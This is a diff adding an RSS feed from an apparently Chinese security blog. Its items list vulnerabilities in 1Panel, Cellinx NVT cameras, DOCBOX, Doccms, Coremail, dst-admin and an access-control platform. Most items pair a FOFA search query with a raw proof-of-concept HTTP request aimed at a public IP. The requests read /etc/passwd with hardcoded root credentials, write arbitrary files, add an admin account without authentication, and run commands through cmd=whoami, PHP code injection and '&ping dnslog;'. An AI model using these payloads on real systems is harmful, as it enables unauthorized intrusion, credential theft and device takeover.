@@ -1,0 +1,87 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>2023hw - Category - Chinchin&#39;s blog</title>
+        <link>http://example.org/categories/2023hw/</link>
+        <description>2023hw - Category - Chinchin&#39;s blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</lastBuildDate><atom:link href="http://example.org/categories/2023hw/" rel="self" type="application/rss+xml" /><item>
+    <title>1Panel loadfile 后台文件读取漏洞</title>
+    <link>http://example.org/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[1Panel loadfile 后台文件读取漏洞 漏洞描述 1Panel 后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件 漏洞影响 1Panel 网络测绘 &ldquo;1Panel&rdquo; 漏洞复现 登陆页面 验证]]></description>
+</item>
+<item>
+    <title>ADKFP门禁出入口综合安防管理平台aDKManageUser文件存在未授权访问</title>
+    <link>http://example.org/adkfp%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0adkmanageuser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/adkfp%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0adkmanageuser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</guid>
+    <description><![CDATA[## fofa 1 body=&#34;/adkfp/getCode&#34; poc 1 http://47.101.78.243/aDKManageUser/selectCll_2?roleId=2&amp;page=1&amp;limit=10]]></description>
+</item>
+<item>
+    <title>Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞 （CVE-2023-23063）</title>
+    <link>http://example.org/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-getfilecontent.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-23063/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-getfilecontent.cgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-23063/</guid>
+    <description><![CDATA[## fofa 1 body=&#34;local/NVT-string.js&#34; poc 1 http://1.222.228.4/cgi-bin/GetFileContent.cgi?USER=root&amp;PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&amp;PATH=/etc/passwd&amp;_=1672577046605]]></description>
+</item>
+<item>
+    <title>Cellinx NVT 摄像机 SetFileContent.cgi 文件 PATH 参数任意文件创建漏洞（CVE-2020-28250）</title>
+    <link>http://example.org/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-setfilecontent.cgi-%E6%96%87%E4%BB%B6-path-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9Ecve-2020-28250/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-setfilecontent.cgi-%E6%96%87%E4%BB%B6-path-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9Ecve-2020-28250/</guid>
+    <description><![CDATA[## fofa 1 body=&#34;local/NVT-string.js&#34; SetFileContent 攻击者可通过 SetFileContent.cgi 创建和写入任意文件，如覆盖 /etc/passwd 等获取服务器权限。 1 2 3 4 5 6 7 8 POST /cgi-bin/SetFileContent.cgi?USER=root&amp;PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&amp;PATH=/etc/html/testdsad11.txt HTTP/1.1 Host: 1.222.228.4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 11 testcontent GET]]></description>
+</item>
+<item>
+    <title>Cellinx NVT 摄像机 UAC.cgi 未授权访问漏洞</title>
+    <link>http://example.org/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-uac.cgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-uac.cgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[## fofa 1 body=&#34;local/NVT-string.js&#34; poc 1 2 3 4 5 6 7 8 POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1 Host: 1.222.228.4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json; charset=UTF-8 Accept-Encoding: gzip Content-Length: 198 {&#34;jsonData&#34;:{&#34;username&#34;:&#34;guest&#34;,&#34;password&#34;:&#34;&#34;,&#34;option&#34;:&#34;add_user&#34;,&#34;data&#34;:{&#34;username&#34;:&#34;testadm1n3&#34;,&#34;password&#34;:&#34;testtest&#34;,&#34;permission&#34;:{&#34;is_admin&#34;:&#34;1&#34;,&#34;view&#34;:&#34;1&#34;,&#34;ptz&#34;:&#34;1&#34;,&#34;setting&#34;:&#34;1&#34;,&#34;dout&#34;:&#34;1&#34;}}}}]]></description>
+</item>
+<item>
+    <title>CODING平台idna目录存在目录遍历漏洞</title>
+    <link>http://example.org/coding%E5%B9%B3%E5%8F%B0idna%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/coding%E5%B9%B3%E5%8F%B0idna%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[## fofa 1 title=&#34;一站式软件研发管理平台&#34; poc 1 /ci/pypi/simple/idna/]]></description>
+</item>
+<item>
+    <title>Coremail 邮件系统未授权访问获取管理员账密</title>
+    <link>http://example.org/coremail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%AF%86/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/coremail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%AF%86/</guid>
+    <description><![CDATA[``` /coremail/common/assets/:/:/:/:/:/:/s? biz=Mzl3MTk4NTcyNw==&amp;mid=2247485877&amp;idx=1&amp;sn=7e5f77db320ccf9013c0b7aa7262 6688chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688b f6adaed61&amp;scene=2]]></description>
+</item>
+<item>
+    <title>DOCBOX dynamiccontent.properties.xhtml 文件 cmd 参数远程代码执行漏洞</title>
+    <link>http://example.org/docbox-dynamiccontent.properties.xhtml-%E6%96%87%E4%BB%B6-cmd-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/docbox-dynamiccontent.properties.xhtml-%E6%96%87%E4%BB%B6-cmd-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[## fofa 1 body=&#34;docbox.webapp&#34; poc 1 2 3 4 5 6 7 8 POST /docbox.webapp/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: 81.169.200.109:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 1567 pfdrt=sc&amp;ln=primefaces&amp;pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&amp;cmd=whoami]]></description>
+</item>
+<item>
+    <title>Doccms html.php任意文件包含</title>
+    <link>http://example.org/doccms-html.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/doccms-html.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid>
+    <description><![CDATA[``` POST /admini/html.php HTTP/1.1 Host: 112.74.114.21 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 75 m=/../../../admini/views/system/lang/editTags.php&amp;tags=1);echo md5(123);//]]></description>
+</item>
+<item>
+    <title>dst-admin cavesConsole 远程命令执行漏洞（CVE-2023-0646）</title>
+    <link>http://example.org/dst-admin-cavesconsole-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0646/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/dst-admin-cavesconsole-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0646/</guid>
+    <description><![CDATA[## fofa 1 title==&#34;饥荒管理后台&#34; poc 1 2 3 4 5 6 7 8 9 POST /home/cavesConsole HTTP/1.1 Host: 101.35.120.58:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json Cookie: JSESSIONID=7b0bfc18-03ff-40ec-95aa-5d520734fe18;rememberMe=deleteMe; Accept-Encoding: gzip Content-Length: 31 {&#34;command&#34;:&#34;\&#34;&amp;ping dnslog;\&#34;&#34;} 1 2 3 4 5]]></description>
+</item>
+</channel>
+</rss>
